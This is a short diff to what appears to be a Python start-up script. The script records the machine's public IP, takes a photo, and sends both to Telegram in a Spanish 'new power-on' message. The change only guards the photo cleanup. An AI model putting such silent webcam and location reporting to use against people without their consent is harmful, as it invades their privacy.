@@ -87,8 +87,11 @@ def create_thread():
 
 global_ip = create_thread()
 picture = take_photo()
+
 text = f"Nuevo encendido desde: {global_ip} en {platform.system()} \n\n \
 Mas información en: https://www.infobyip.com/ip-{global_ip}.html"
 send_to_telegram(text, picture)
-picture.close()
-os.remove(PHOTO_NAME)
+
+if picture:
+    picture.close()
+    os.remove(PHOTO_NAME)
